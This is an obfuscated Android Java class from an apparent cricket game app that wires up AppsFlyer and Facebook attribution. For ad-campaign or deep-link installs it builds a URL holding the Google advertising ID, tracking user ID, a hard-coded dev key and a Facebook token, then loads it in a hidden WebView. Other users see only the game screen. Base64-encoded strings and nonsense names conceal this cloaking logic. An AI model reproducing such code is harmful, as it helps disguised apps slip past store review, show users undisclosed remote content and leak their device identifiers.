package com.league.krikett.set;

import static com.league.krikett.CL.ghddh;
import static com.league.krikett.CL.iuygc;

import android.content.Intent;
import android.util.Log;
import android.view.View;

import androidx.annotation.Nullable;

import com.appsflyer.AppsFlyerConversionListener;
import com.appsflyer.AppsFlyerLib;
import com.facebook.FacebookSdk;
import com.facebook.appevents.AppEventsLogger;
import com.facebook.applinks.AppLinkData;
import com.league.krikett.ApplicationCL;
import com.league.krikett.ButtonActivity;
import com.league.krikett.CL;

import java.util.Map;

public class ApFbCL {

    public static String skal;
    public static String zcxxa = "-";
    public static String qqweqa;
    public static String lojh;
    public static String vvgsja = "QTZNNjVjZWtxeXd0dEJVS2d4VVl6RA==";
    public static String uvahwhy;
    public static String uydva;
    public static String qweqqd;
    public static CL cl;
    public static String zxcac = null;
    public static String eqeqds = "-";

    public static void apfl(ApplicationCL applicationCL) {

        AppsFlyerLib.getInstance().init(WebSettingCL.decodeCl(vvgsja), new AppsFlyerConversionListener() {
            @Override
            public void onConversionDataSuccess(Map<String, Object> map) {


                zcxxa = map.get(WebSettingCL.decodeCl("YWZfc3RhdHVz")).toString();

                if (zcxxa.equals(WebSettingCL.decodeCl("Tm9uLW9yZ2FuaWM="))) {

                    try {
                        uvahwhy = map.get(WebSettingCL.decodeCl("Y2FtcGFpZ24=")).toString();
                    } catch (Exception e) {

                    }

                    try {

                        uydva = map.get(WebSettingCL.decodeCl("bWVkaWFfc291cmNl")).toString();
                    } catch (Exception e) {

                    }

                    try {

                        qweqqd = map.get(WebSettingCL.decodeCl("YWZfY2hhbm5lbA==")).toString();
                    } catch (Exception e) {

                    }

                    lojh = parseCL(uvahwhy);
                }

            }

            @Override
            public void onConversionDataFail(String s) {

            }

            @Override
            public void onAppOpenAttribution(Map<String, String> map) {

            }

            @Override
            public void onAttributionFailure(String nnb) {

            }
        }, applicationCL.getApplicationContext());
        AppsFlyerLib.getInstance().start(applicationCL.getApplicationContext());

    }

    public static String parseCL(String s) {
        String rtysk;
        String vbxdz;
        String ydzs;
        String bhcd;
        String bvgxxf;
        String xzaf;
        String[] campLucky = s.split("_");

        try {
            rtysk = campLucky[0];
        } catch (Exception e) {

            rtysk = "";
        }
        try {
            vbxdz = campLucky[1];
        } catch (Exception e) {

            vbxdz = "";
        }
        try {
            ydzs = campLucky[2];
        } catch (Exception e) {
            ydzs = "";

        }
        try {
            bhcd = campLucky[3];
        } catch (Exception e) {
            bhcd = "";

        }
        try {
            bvgxxf = campLucky[4];
        } catch (Exception e) {
            bvgxxf = "";
            ;
        }
        try {
            xzaf = campLucky[5];
        } catch (Exception e) {
            xzaf = "";

        }

        Log.d("weq",skal);
        String sad = WebSettingCL.decodeCl("P21lZGlhX3NvdXJjZT0=") + ApFbCL.uydva +
                WebSettingCL.decodeCl("JnN1YjE9") + rtysk +
                WebSettingCL.decodeCl("JnN1YjI9") + vbxdz +
                WebSettingCL.decodeCl("JnN1YjM9") + ydzs +
                WebSettingCL.decodeCl("JnN1YjQ9") + bhcd +
                WebSettingCL.decodeCl("JnN1YjU9") + bvgxxf +
                WebSettingCL.decodeCl("JnN1YjY9") + xzaf +
                WebSettingCL.decodeCl("JmNhbXBhaWduPQ==") + uvahwhy +
                WebSettingCL.decodeCl("Jmdvb2dsZV9hZGlkPQ==") + qqweqa +
                WebSettingCL.decodeCl("JmFmX3VzZXJpZD0=") + skal +
                WebSettingCL.decodeCl("JmFmX2NoYW5uZWw9") + qweqqd +
                WebSettingCL.decodeCl("JmRldl9rZXk9") + WebSettingCL.decodeCl(vvgsja) +
                WebSettingCL.decodeCl("JmJ1bmRsZT0=") + cl.getPackageName() +
                WebSettingCL.decodeCl("JmZiX2FwcF9pZD0=") + ghddh +
                WebSettingCL.decodeCl("JmZiX2F0PQ==") + iuygc;

        return sad;

    }

    public static void dipCl(){

        FacebookSdk.setApplicationId(ghddh);
        FacebookSdk.setAdvertiserIDCollectionEnabled(true);
        FacebookSdk.sdkInitialize(cl.getApplicationContext());
        FacebookSdk.fullyInitialize();
        FacebookSdk.setAutoInitEnabled(true);
        FacebookSdk.setAutoLogAppEventsEnabled(true);

        AppEventsLogger.activateApp(cl.getApplication());
        AppLinkData.fetchDeferredAppLinkData(cl.getApplicationContext(), new AppLinkData.CompletionHandler() {
            @Override
            public void onDeferredAppLinkDataFetched(@Nullable AppLinkData appLinkData) {

                if (appLinkData == null) {
                    appLinkData = AppLinkData.createFromActivity(cl);

                }
                if (appLinkData != null) {

                    String[] as = appLinkData.getTargetUri().toString().split("://");
                    zxcac = as[1];
                    eqeqds = parseCL(zxcac);

                } else {

                }

            }
        });

    }

    public static void startWeCl(String link, String status){
        if (zcxxa.equals(WebSettingCL.decodeCl("Tm9uLW9yZ2FuaWM="))) {
            String load = link + lojh;
            Log.d("weq","Apps"+load);
            cl.getSharedPreferences(cl.getPackageName(), cl.MODE_PRIVATE).edit().putString(WebSettingCL.decodeCl("c2F2ZWRVcmw="), load).apply();
            CL.webViewCL.setVisibility(View.VISIBLE);
            CL.webViewCL.loadUrl(load);

        } else if (zxcac != null) {
            String load = link + eqeqds;
            Log.d("weq","Dipp"+load);
            cl.getSharedPreferences(cl.getPackageName(), cl.MODE_PRIVATE).edit().putString(WebSettingCL.decodeCl("c2F2ZWRVcmw="), load).apply();
            CL.webViewCL.setVisibility(View.VISIBLE);
            CL.webViewCL.loadUrl(load);

        } else {
            if (status.equals("0")) {

                cl.startActivity(new Intent(cl.getApplicationContext(), ButtonActivity.class));
                cl.finishAffinity();
                Log.d("weq","game");
            } else {

               String load = link + WebSettingCL.decodeCl("P21lZGlhX3NvdXJjZT1vcmdhbmlj") +
                       WebSettingCL.decodeCl("Jmdvb2dsZV9hZGlkPQ==") + qqweqa +
                       WebSettingCL.decodeCl("JmFmX3VzZXJpZD0=") + skal +
                       WebSettingCL.decodeCl("JmRldl9rZXk9") + WebSettingCL.decodeCl(vvgsja) +
                       WebSettingCL.decodeCl("JmJ1bmRsZT0=") + cl.getPackageName() +
                       WebSettingCL.decodeCl("JmZiX2FwcF9pZD0=") + ghddh +
                       WebSettingCL.decodeCl("JmZiX2F0PQ==") + iuygc;

                cl.getSharedPreferences(cl.getPackageName(), cl.MODE_PRIVATE).edit().putString(WebSettingCL.decodeCl("c2F2ZWRVcmw="), load).apply();
                CL.webViewCL.setVisibility(View.VISIBLE);
                CL.webViewCL.loadUrl(load);
                Log.d("weq","organic"+load);
            }
        }
    }


}
